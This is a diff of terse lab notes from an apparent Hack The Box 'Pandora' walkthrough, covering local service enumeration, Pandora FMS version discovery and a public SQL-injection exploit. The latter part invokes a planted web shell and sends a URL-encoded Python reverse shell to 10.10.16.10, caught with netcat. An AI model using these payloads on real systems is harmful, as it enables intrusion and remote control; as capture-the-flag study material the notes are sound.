@@ -73,3 +73,50 @@ tcp      LISTEN    0         511                      *:80                     *
 tcp      LISTEN    0         128                   [::]:22                  [::]:*                  
 daniel@pandora:/var/www/pandora$ curl localhost 53
 <meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
+
+daniel@pandora:/var/www/pandora/pandora_console$ netstat -tnlp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      - 
+
+// port 53 is listening on 127.0.0.53
+
+//check http service conf, get another domainname for dir of pandora, which is supposed to be access on localhost only
+
+daniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf 
+<VirtualHost localhost:80>
+  ServerAdmin admin@panda.htb
+  ServerName pandora.panda.htb
+  DocumentRoot /var/www/pandora
+  AssignUserID matt matt
+  <Directory /var/www/pandora>
+    AllowOverride All
+  </Directory>
+  ErrorLog /var/log/apache2/error.log
+  CustomLog /var/log/apache2/access.log combined
+</VirtualHost>
+
+
+http://127.0.0.1:9000/pandora_console/
+v7.0NG.742_FIX_PERL2020 //it is pandora fms
+
+https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py
+
+http://127.0.0.1:9000/pandora_console/images/cmd.php?test=id
+uid=1000(matt) gid=1000(matt) groups=1000(matt)
+
+http://127.0.0.1:9000/pandora_console/images/cmd.php?test=export%20RHOST=%2210.10.16.10%22;export%20RPORT=8821;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22sh%22)%27
+
+└─$ nc -nvlp 8821
+listening on [any] 8821 ...
+connect to [10.10.16.10] from (UNKNOWN) [10.10.11.136] 36668
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+python3 -c "import pty;pty.spawn('/bin/bash')"
+matt@pandora:/var/www/pandora/pandora_console/images$ 
+
